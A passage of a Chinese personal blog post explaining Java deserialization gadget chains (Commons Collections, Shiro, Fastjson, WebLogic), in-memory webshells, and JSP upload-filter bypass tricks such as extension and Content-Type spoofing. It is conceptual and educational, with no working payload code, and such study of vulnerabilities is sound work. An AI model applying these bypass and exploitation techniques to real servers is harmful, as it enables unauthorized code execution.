+<p>Java 序列化允许把一个对象的状态写成字节流，之后通过 <code>ObjectInputStream.readObject()</code> 还原。问题在于：当这个字节流来自不可信来源时，<code>readObject()</code> 会忠实地按照字节流里的描述去还原对象，并在还原过程中调用对象自己的 <code>readObject()</code> 方法。</p>
+<p>也就是说如果攻击者能构造一个恶意对象的字节流，让目标服务器执行 <code>readObject()</code>，就会触发这个对象在 <code>readObject()</code> 中预设的逻辑。 这听起来似乎需要目标 classpath 上恰好有一个本身就带恶意 <code>readObject()</code>的类，但 Java 生态的庞大恰恰提供了大量可以被串联起来的“中间件”——这就是 <strong>Gadget Chain（利用链）</strong></p>
+
+<h4 id="commons-collections反序列化利用链的教科书" data-numberify>Commons Collections：反序列化利用链的教科书<a class="anchor ms-1" href="#commons-collections反序列化利用链的教科书"></a></h4>
+<p>Apache Commons Collections 是 Java 反序列化利用链最经典、影响最广的源头。它的核心问题出在 <code>InvokerTransformer</code> 这个类上。</p>
+<p><code>InvokerTransformer</code> 实现了 <code>Transformer</code> 接口，它的 <code>transform()</code> 方法会通过反射调用一个指定对象的指定方法。如果直接传入 <code>Runtime</code> 对象，并把方法名设为 <code>exec</code>，参数设为命令，那么调用 <code>transform()</code> 就等于执行命令。</p>
+<p>但直接调用 <code>transform()</code> 不算漏洞，真正的利用链需要解决的是：<strong>如何在反序列化过程中，自动触发这个 <code>transform()</code> 调用？</strong></p>
+<p>CC1 链的经典答案是 <strong><code>AnnotationInvocationHandler</code></strong>。这个类在 <code>readObject()</code> 的过程中会对它持有的 Map 进行遍历操作，而如果这个 Map 被包装成了 <strong><code>TransformedMap</code></strong>，并且其 value 对应的 Transformer 被设置为恶意的 <code>ChainedTransformer</code>，那么遍历 Map 时就会触发 <code>transform()</code>，进而反射调用 <code>Runtime.exec()</code>。</p>
+<p>把这条链压缩成一行调用栈，大致是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">ObjectInputStream.readObject()
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  → AnnotationInvocationHandler.readObject()
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    → TransformedMap 遍历
+</span></span><span class="line"><span class="ln">4</span><span class="cl">      → ChainedTransformer.transform()
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        → InvokerTransformer.transform()
+</span></span><span class="line"><span class="ln">6</span><span class="cl">          → Method.invoke()
+</span></span><span class="line"><span class="ln">7</span><span class="cl">            → Runtime.exec()
+</span></span></code></pre></div><p>这条链的利用条件通常比较苛刻（依赖特定版本的 Commons Collections 和 JDK），但它确立了 Gadget Chain 的基本思维模式：<strong>不需要目标直接反序列化一个“恶意类”，只需要目标 classpath 上存在一条“反序列化时会走到危险方法”的调用路径</strong>。</p>
+<p>在实际测试中，我们通常不需要手动去写这些链，开源工具 <strong>ysoserial</strong> 已经内置了大量经典的 Gadget Chain，直接生成 payload 即可。</p>
+
+<h4 id="从原生链到框架漏洞shirofastjsonweblogic" data-numberify>从原生链到框架漏洞：Shiro、Fastjson、WebLogic<a class="anchor ms-1" href="#从原生链到框架漏洞shirofastjsonweblogic"></a></h4>
+<p>原生反序列化链的思维很快被应用到了各种框架和中间件上，因为它们各自在“处理不可信输入”这件事上出现了不同类型的疏忽。</p>
+<p><strong>Apache Shiro RememberMe（CVE-2016-4437）</strong>
+Shiro 为了实现“记住我”，会把用户信息序列化后加密，放在 Cookie 的 <code>rememberMe</code> 字段里。问题在于<strong>加密密钥是硬编码的</strong>（在旧版本中），攻击者只要拿到这个密钥，就可以自己构造恶意序列化数据，加密后作为 <code>rememberMe</code> Cookie 发给服务器，服务器解密后直接 <code>readObject()</code>，触发反序列化。这里的攻击入口变成了一个 <strong>Cookie</strong>。</p>
+<p><strong>Fastjson <code>autoType</code></strong>
+Fastjson 在解析 JSON 时，如果 JSON 里带有 <code>@type</code> 字段，它会尝试加载并实例化指定的类。<code>autoType</code> 机制的本意是支持多态，但它允许攻击者指定任意类。结合 classpath 上已有的 Gadget（比如 <code>JdbcRowSetImpl</code>），攻击者可以让 Fastjson 在反序列化 JSON 的过程中，间接走到 JNDI 注入或命令执行的路径上去。这里的攻击入口是 <strong>JSON 字符串</strong>。</p>
+<p><strong>WebLogic T3/XMLDecoder</strong>
+WebLogic 的 T3 协议在通信时会传输序列化对象，而早期版本没有对反序列化的内容做安全限制。XMLDecoder 则是另一个入口：它本意是把 XML 描述还原成对象，但如果 XML 里的类名可控，攻击者就可以指定 <code>ProcessBuilder</code> 之类的类来执行命令。这里的攻击入口是 <strong>T3 协议或 XML 输入</strong>。</p>
+<p>这三类框架漏洞的共同点是：<strong>反序列化的入口从“一个显式的 <code>readObject()</code> 调用”扩散到了 Cookie、JSON、通信协议、XML 等各种看似无关的交互面</strong>。</p>
+
+<h4 id="内存马反序列化的后渗透延伸" data-numberify>内存马：反序列化的“后渗透延伸”<a class="anchor ms-1" href="#内存马反序列化的后渗透延伸"></a></h4>
+<p>反序列化拿到命令执行往往不是终点。在 Tomcat 等 Web 容器中，攻击者可以利用反序列化链在运行时<strong>动态注册一个恶意的 <code>Filter</code>、<code>Servlet</code> 或 <code>Listener</code></strong>，这就是“内存马”。它不落地任何文件，只存在于 JVM 内存中，传统的文件查杀很难发现。这体现了反序列化漏洞的另一个维度：它不仅可以执行一次命令，还可以实现<strong>持久化的、无文件落地的控制</strong>。</p>
+
+<h3 id="jsp-文件上传" data-numberify>JSP 文件上传<a class="anchor ms-1" href="#jsp-文件上传"></a></h3>
+<p>JSP 文件上传漏洞的本质，建立在一个简单的容器行为上：<strong>Tomcat 等 Servlet 容器默认会把 <code>.jsp</code> 文件当作需要编译执行的动态资源</strong>。只要文件以 <code>.jsp</code> 结尾、落在 Web 应用目录下，访问对应的 URL 时，容器就会把它翻译、编译并执行。</p>
+<p>因此，攻击目标非常明确：让一个包含恶意 Java 代码的 <code>.jsp</code> 文件通过上传点的校验，落到可以被访问的目录中。</p>
+
+<h4 id="绕过校验" data-numberify>绕过校验<a class="anchor ms-1" href="#绕过校验"></a></h4>
+<p>上传功能的安全校验通常分几层，绕过思路也对应着攻击每一层的薄弱点：</p>
+<p><strong>前端校验</strong>
+仅靠 JavaScript 检查文件后缀或 <code>accept</code> 属性。用 Burp Suite 拦截请求，把 <code>filename=&quot;test.jpg&quot;</code> 改成 <code>filename=&quot;shell.jsp&quot;</code>，前端校验完全失效。</p>
+<p><strong>黑名单绕过</strong>
+服务端禁止 <code>.jsp</code>，但可能遗漏了同样会被容器解析的后缀。<code>jspx</code>、<code>jspf</code> 在某些配置下同样可以被当作 JSP 处理。此外还有 <code>shell.jsp.</code>（末尾加点）、<code>shell.jsp%20</code>（URL 编码空格）、<code>shell.jsp::$DATA</code>（Windows NTFS 流）等技巧，利用校验逻辑和文件系统解析之间的差异。</p>
+<p><strong>Content-Type 绕过</strong>
+只检查 HTTP 头中的 <code>Content-Type</code> 是否为 <code>image/jpeg</code>。攻击者在上传 JSP 时把请求头改成 <code>Content-Type: image/jpeg</code> 即可。</p>
+<p><strong>文件内容检查（图片马）</strong>
+检查文件幻数（Magic Number），要求文件头是图片格式。攻击者可以在一个正常 JPEG 文件末尾追加 JSP 代码，形成一个“图片马”。如果服务器还存在文件包含漏洞，或者某些解析配置缺陷，这个文件仍然可能被执行。</p>
+<p>这些操作都和PHP的文件上传差不多。</p>
+
+<h4 id="解析漏洞让不该执行的执行" data-numberify>解析漏洞：让“不该执行的”执行<a class="anchor ms-1" href="#解析漏洞让不该执行的执行"></a></h4>
+<p>有时候即使上传成功了，文件后缀不在黑名单里，按理说不应该被解析。但服务器本身的解析特性可能“帮”了攻击者。典型的例子是 Tomcat CVE-2017-12615：在特定配置下，Tomcat 允许通过 PUT 方法上传文件，并且存在 <code>shell.jsp/</code> （末尾带斜杠）这样的路径可以被当作 JSP 解析的绕过方式。这类漏洞利用了容器对文件路径的解析规则与上传校验规则之间的不一致。</p>
+</div>
+</div>
+<div class="modal fade" id="rewardModal" tabindex="-1" aria-labelledby="rewardModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content surface">
+      <div class="modal-header">
+        <h5 class="modal-title text-surface" id="rewardModalLabel"><i class="fas fa-fw fa-coffee me-1"></i>Buy me a coffee</h5>
+        <a href="#" data-bs-dismiss="modal" class="btn-close" aria-label="Close"></a>
+      </div>
+      <div class="modal-body">
+        <ul class="nav nav-tabs mb-3" role="tablist"><li class="nav-item text-nowrap" role="presentation">
+            <a class="nav-link active" id="reward-wechat-tab" data-bs-toggle="tab" href="#reward-wechat" role="tab" aria-controls="reward-wechat" aria-selected="true">
+              <i class="fab fa-fw fa-weixin me-1"></i>WeChat
+            </a>
+          </li></ul>
+        <div class="tab-content" id="rewardTabContent"><div class="tab-pane fade post-reward-content text-center show active" id="reward-wechat" role="tabpanel" aria-labelledby="reward-wechat-tab">
+            <img class="img-fluid post-reward-img" src="https://decimo.top/images/wechat.jpg" loading="lazy" data-viewer-invisible />
+          </div></div>
+      </div>
+    </div>
+  </div>
+</div></div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/">计算机网络知识梳理</a>
+    </div><div class="post-nav post-next">
+      <a href="/posts/ctf-web-guide/">[持续更新] CTF-Web Guide</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">Copyright</h2>
+    </div>
+    <div class="card-body"><a class="d-flex align-items-center flex-column" target="_blank" rel="license noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">
+  <span><i class="fab fa-fw fa-2x fa-creative-commons"></i><i class="fab fa-fw fa-2x fa-creative-commons-by"></i><i class="fab fa-fw fa-2x fa-creative-commons-nc"></i><i class="fab fa-fw fa-2x fa-creative-commons-sa"></i></span>
+  CC BY-NC-SA 4.0 
+</a>
+
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">Comments</h2>
+  </div>
+  <div class="card-body">
+
+<div class="giscus"></div>
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="card mb-3">
+  <div class="card-body text-center">
+    <img src="/images/my-avatar.jpg" alt="我的头像" class="rounded-circle mb-2" width="100" height="100">
+    <h5 class="card-title">decimo</h5>
+	<p id="random-quote" class="card-text text-muted"></p>
+	<script>
+	const quotes = [
+  "欢迎大佬莅临",
+  "路漫漫其修远兮，吾将上下而求索",
+  "前途是光明的，道路是曲折的",
+  "我喜欢你们",
+  "生命的有限同时赋予了生活意义和遗憾"
+	];
+	document.getElementById('random-quote').innerText = quotes[Math.floor(Math.random() * quotes.length)];
+	</script>
+<nav class="d-flex justify-content-center gap-2 my-2">
+  <a class="btn btn-sm btn-outline-dark rounded-circle" href="https://github.com/imdecimo" title="GitHub" target="_blank">
+    <i class="fab fa-github"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-primary rounded-circle" href="mailto:l2556843965@163.com" title="Email">
+    <i class="fas fa-envelope"></i>
+  </a>
+  <a class="btn btn-sm btn-outline-danger rounded-circle" href="https://space.bilibili.com/595746072" title="Bilibili" target="_blank">
+  <i class="fab fa-bilibili"></i> 
+</a>
+  
+</nav>
+  </div>
+</div>
+
+
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            Posts
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  Recent Posts
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="java" src="https://decimo.top/images/java.jpg" loading="lazy"
+     width="760"
+     height="506"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/java/">
+        java
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          October 31, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="计算机网络知识梳理" src="https://decimo.top/images/network.jpg" loading="lazy"
+     width="480"
+     height="300"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/">
+        计算机网络知识梳理
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          July 12, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="UOOC艺术的星空：艺术美学十二讲习题答案" src="https://decimo.top/images/SZU.png" loading="lazy"
+     width="322"
+     height="97"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E8%89%BA%E6%9C%AF%E7%9A%84%E6%98%9F%E7%A9%BA%E6%9C%9F%E6%9C%AB%E7%AD%94%E6%A1%88/">
+        UOOC艺术的星空：艺术美学十二讲习题答案
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          June 29, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="关于打印服务之CUPS_IPP的介绍" src="https://decimo.top/images/CUPS.jpg" loading="lazy"
+     width="946"
+     height="583"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E5%85%B3%E4%BA%8E%E6%89%93%E5%8D%B0%E6%9C%8D%E5%8A%A1%E4%B9%8Bcups_ipp%E7%9A%84%E4%BB%8B%E7%BB%8D/">
+        关于打印服务之CUPS_IPP的介绍
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          June 13, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+    
+  
+  <div class="d-flex">
+      <div
+        class="flex-shrink-0 d-flex justify-content-center align-items-center"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="思考能力是如何被阶级化的" src="https://decimo.top/images/star.jpeg" loading="lazy"
+     width="1080"
+     height="651"/>
+  </picture>
+      </div>
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center ms-3">
+      <a class="post-title" href="/posts/%E5%85%B3%E4%BA%8E%E7%9C%BC%E7%95%8C%E5%BD%A2%E5%BC%8F%E4%B8%BB%E4%B9%89%E5%92%8C%E6%80%9D%E7%BB%B4%E8%83%BD%E5%8A%9B%E7%9A%84%E7%8C%9C%E6%83%B3/">
+        思考能力是如何被阶级化的
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 28, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        Contents
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      
+	  
+      
+      
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#历史">历史</a></li>
+    <li><a href="#哲学">哲学</a></li>
+    <li><a href="#jndi">JNDI</a>
+      <ul>
+        <li><a href="#命名服务">命名服务</a></li>
+        <li><a href="#目录服务">目录服务</a></li>
+        <li><a href="#回头">回头</a></li>
+        <li><a href="#jndi-之前">JNDI 之前</a></li>
+        <li><a href="#jndi-以后">JNDI 以后</a>
+          <ul>
+            <li><a href="#在容器中配置数据源">在容器中配置数据源</a></li>
+            <li><a href="#在代码中通过-jndi-引用">在代码中通过 JNDI 引用</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web服务与框架">Web服务与框架</a>
+      <ul>
+        <li><a href="#tomcat-是-servlet-容器">Tomcat 是 Servlet 容器</a></li>
+        <li><a href="#spring-是企业级应用框架">Spring 是企业级应用框架</a></li>
+        <li><a href="#spring-mvc衔接二者">Spring MVC：衔接二者</a></li>
+        <li><a href="#spring-boot整合层不是新的一层">Spring Boot：整合层，不是新的一层</a></li>
+        <li><a href="#jsp-本质上是-servlet">JSP 本质上是 Servlet</a></li>
+      </ul>
+    </li>
+    <li><a href="#安全方面">安全方面</a>
+      <ul>
+        <li><a href="#jndi注入">JNDI注入</a>
+          <ul>
+            <li><a href="#从按名取物到按名加载代码">从“按名取物”到“按名加载代码”</a></li>
+            <li><a href="#工厂-和-reference对象-是什么">工厂 和 Reference对象 是什么</a></li>
+            <li><a href="#三种协议三种角色">三种协议，三种角色</a></li>
+            <li><a href="#rmi-利用链条">RMI 利用链条</a></li>
+            <li><a href="#ldap-利用链条">LDAP 利用链条</a></li>
+          </ul>
+        </li>
+        <li><a href="#java-原生反序列化">Java 原生反序列化</a>
+          <ul>
+            <li><a href="#commons-collections反序列化利用链的教科书">Commons Collections：反序列化利用链的教科书</a></li>
+            <li><a href="#从原生链到框架漏洞shirofastjsonweblogic">从原生链到框架漏洞：Shiro、Fastjson、WebLogic</a></li>
+            <li><a href="#内存马反序列化的后渗透延伸">内存马：反序列化的“后渗透延伸”</a></li>
+          </ul>
+        </li>
+        <li><a href="#jsp-文件上传">JSP 文件上传</a>
+          <ul>
+            <li><a href="#绕过校验">绕过校验</a></li>
+            <li><a href="#解析漏洞让不该执行的执行">解析漏洞：让“不该执行的”执行</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      Actions
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">decimo的小窝</p>
+    <p class="text-secondary mb-2"><small>Welcome to decimo’s Blog! I look forward to sharing this great journey with you.</small></p>Copyright © 2026 decimo. All Rights Reserved.
+    <div class="footer-line visitor" style="margin: 0.5em 0;">
+      <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
+        🐾 总访客数 <span id="busuanzi_value_site_uv">...</span>
+      </span>
+      <span id="busuanzi_container_site_pv" class="footer-divider" title="总访问量" style="display: inline; margin-left: 1em;">
+        👀 总访问量 <span id="busuanzi_value_site_pv">...</span>
+      </span>
+    </div>
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+    <a class="nav-link social-link p-0 me-1 mb-2" href="mailto:mailto:l2556843965@163.com" title="Email">
+      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
+    </a>
+      <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="https://github.com/imdecimo" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://decimo.top/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.28dd2d3072601810e6c4f2bba33b7fcb56216c0db23356903148d0018fbb8195.js" integrity="sha256-KN0tMHJgGBDmxPK7ozt/y1YhbA2yM1aQMUjQAY&#43;7gZU=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
+<script src="/js/toc-auto.635186e6d874d0dfed4a40f65dcc71e277a9772461a22e01fd1e5aabc804694d.js" integrity="sha256-Y1GG5th00N/tSkD2Xcxx4nepdyRhoi4B/R5aq8gEaU0=" crossorigin="anonymous" defer></script>
+<script src="/js/content-width.934f78874ee3ec7867ee4eb0d748e4532407370231346898fbe3108e92526acb.js" integrity="sha256-k094h07j7Hhn7k6w10jkUyQHNwIxNGiY&#43;&#43;MQjpJSass=" crossorigin="anonymous" defer></script>
+
+<script src="https://giscus.app/client.js"
+    data-repo="imdecimo/imdecimo.github.io"
+    data-repo-id="R_kgDOQcBRNA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOQcBRNM4Cy98G"
+    data-mapping="pathname"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    defer>
+</script>
+
+
+  </body>
+</html>
